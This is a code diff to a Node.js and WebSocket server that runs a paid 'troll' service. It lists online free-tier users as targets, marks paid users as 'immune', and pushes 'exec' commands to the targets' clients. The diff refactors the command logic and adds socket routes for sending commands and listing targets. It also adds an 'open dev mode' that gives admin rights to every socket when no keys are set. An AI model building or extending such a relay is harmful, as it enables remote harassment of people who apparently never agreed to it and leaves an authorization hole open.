@@ -93,6 +93,34 @@ function prune() {
 }
 setInterval(prune, 5000).unref?.();
 
+// ---- shared command/target logic (used by BOTH the HTTP routes and the WS handler)
+function buildTargets(selfUserId) {
+  return [...presence.values()]
+    .filter(p => isOnline(p) && p.tier !== "paid" && p.userId !== selfUserId)
+    .sort((a, b) => (a.name || "").localeCompare(b.name || ""))
+    .map(p => ({
+      userId: p.userId, name: p.name, displayName: p.displayName,
+      placeId: p.placeId, hubId: p.hubId, ageMs: now() - p.lastSeen, queued: p.queue.length,
+    }));
+}
+function sendExec(socket, cmd) {
+  try { socket.send(JSON.stringify({ type: "exec", ...cmd })); return true; } catch { return false; }
+}
+// Validate + deliver a command. Returns { code, body } (same shape HTTP and WS use).
+function enqueueCommand({ targetUserId, action, args, from }) {
+  if (!ACTIONS.has(action)) return { code: 400, body: { ok: false, error: "unknown action" } };
+  const target = presence.get(targetUserId);
+  if (!isOnline(target)) return { code: 404, body: { ok: false, error: "target offline" } };
+  if (target.tier === "paid") return { code: 403, body: { ok: false, error: "target is immune (paid)" } };
+  let cleanArgs = {};
+  if (args && typeof args === "object") { try { if (JSON.stringify(args).length <= 4096) cleanArgs = args; } catch {} }
+  const cmd = { id: ++cmdCounter + "-" + now(), action, args: cleanArgs, from, ts: now() };
+  if (wsOpen(target) && sendExec(target.ws, cmd)) return { code: 200, body: { ok: true, pushed: true, id: cmd.id } };
+  target.queue.push(cmd);
+  if (target.queue.length > MAX_QUEUE) target.queue.splice(0, target.queue.length - MAX_QUEUE);
+  return { code: 200, body: { ok: true, queued: target.queue.length, id: cmd.id } };
+}
+
 // ---------------------------------------------------------------------------
 // tiny per-IP rate limiter (token bucket)
 // ---------------------------------------------------------------------------
@@ -236,19 +264,10 @@ app.post("/api/sync", (req, res) => {
 // --- paid: list trollable (free, online) targets ----------------------------
 app.get("/api/targets", (req, res) => {
   if (adminHub(req, res) === null) return;
-  const self = cleanStr(req.query.self, 24);
-  const out = [...presence.values()]
-    .filter(p => isOnline(p) && p.tier !== "paid" && p.userId !== self)
-    .sort((a, b) => a.name.localeCompare(b.name))
-    .map(p => ({
-      userId: p.userId, name: p.name, displayName: p.displayName,
-      placeId: p.placeId, hubId: p.hubId, ageMs: now() - p.lastSeen,
-      queued: p.queue.length,
-    }));
-  res.json({ ok: true, targets: out, serverTime: now() });
+  res.json({ ok: true, targets: buildTargets(cleanStr(req.query.self, 24)), serverTime: now() });
 });
 
-// --- paid: enqueue a troll command against a target -------------------------
+// --- paid: enqueue a troll command against a target (HTTP fallback) ----------
 app.post("/api/command", (req, res) => {
   const ip = clientIp(req);
   const senderHub = adminHub(req, res);
@@ -256,33 +275,13 @@ app.post("/api/command", (req, res) => {
   if (!rateLimit("cmd:" + ip, 5, 10)) return res.status(429).json({ ok: false, error: "slow down" });
 
   const b = req.body || {};
-  const targetUserId = cleanStr(b.targetUserId, 24);
-  const action = cleanStr(b.action, 24);
-  if (!ACTIONS.has(action)) return res.status(400).json({ ok: false, error: "unknown action" });
-
-  const target = presence.get(targetUserId);
-  if (!isOnline(target)) return res.status(404).json({ ok: false, error: "target offline" });
-  if (target.tier === "paid") return res.status(403).json({ ok: false, error: "target is immune (paid)" });
-
-  // clamp args payload size
-  let args = {};
-  if (b.args && typeof b.args === "object") {
-    try { if (JSON.stringify(b.args).length <= 4096) args = b.args; } catch {}
-  }
-
-  const cmd = {
-    id: ++cmdCounter + "-" + now(),
-    action, args,
+  const r = enqueueCommand({
+    targetUserId: cleanStr(b.targetUserId, 24),
+    action: cleanStr(b.action, 24),
+    args: b.args,
     from: { userId: cleanStr(b.fromUserId, 24), name: cleanStr(b.fromName, 32), hub: senderHub || "?" },
-    ts: now(),
-  };
-  // If the target holds a live socket, push instantly (no polling delay). Else queue for its next poll.
-  if (wsOpen(target)) {
-    try { target.ws.send(JSON.stringify(cmd)); return res.json({ ok: true, pushed: true, id: cmd.id }); } catch {}
-  }
-  target.queue.push(cmd);
-  if (target.queue.length > MAX_QUEUE) target.queue.splice(0, target.queue.length - MAX_QUEUE);
-  res.json({ ok: true, queued: target.queue.length, id: cmd.id });
+  });
+  res.status(r.code).json(r.body);
 });
 
 const httpServer = app.listen(PORT, () => {
@@ -307,6 +306,9 @@ wss.on("connection", (socket) => {
       const userId = cleanStr(msg.userId, 24);
       if (!userId || userId === "0") return;
       socket.userId = userId;
+      // paid sockets authenticate by key -> may send cmd/targets over the socket
+      if (msg.key && HUB_KEYS.has(String(msg.key))) socket.adminHub = HUB_KEYS.get(String(msg.key));
+      else if (HUB_KEYS.size === 0) socket.adminHub = ""; // open dev mode
       let p = presence.get(userId);
       if (!p) { p = { userId, firstSeen: now(), queue: [] }; presence.set(userId, p); }
       p.name        = cleanStr(msg.name, 32);
@@ -319,12 +321,28 @@ wss.on("connection", (socket) => {
       p.ws          = socket;
       // flush anything that queued before the socket was up (free only)
       if (p.tier !== "paid" && p.queue.length) {
-        for (const c of p.queue) { try { socket.send(JSON.stringify(c)); } catch {} }
+        for (const c of p.queue) sendExec(socket, c);
         p.queue = [];
       }
+
     } else if (msg.type === "hb") {
       const p = socket.userId && presence.get(socket.userId);
       if (p) p.lastSeen = now();
+
+    } else if (msg.type === "cmd") {
+      if (socket.adminHub === undefined) return;                 // not an authed admin socket
+      if (!rateLimit("wscmd:" + (socket.userId || "?"), 8, 16)) return;
+      const r = enqueueCommand({
+        targetUserId: cleanStr(msg.targetUserId, 24),
+        action: cleanStr(msg.action, 24),
+        args: msg.args,
+        from: { userId: socket.userId || "", name: cleanStr(msg.fromName, 32), hub: socket.adminHub || "?" },
+      });
+      try { socket.send(JSON.stringify({ type: "ack", rid: msg.rid, ok: r.body.ok, error: r.body.error, id: r.body.id })); } catch {}
+
+    } else if (msg.type === "targets") {
+      if (socket.adminHub === undefined) return;
+      try { socket.send(JSON.stringify({ type: "targets", targets: buildTargets(socket.userId) })); } catch {}
     }
   });
 
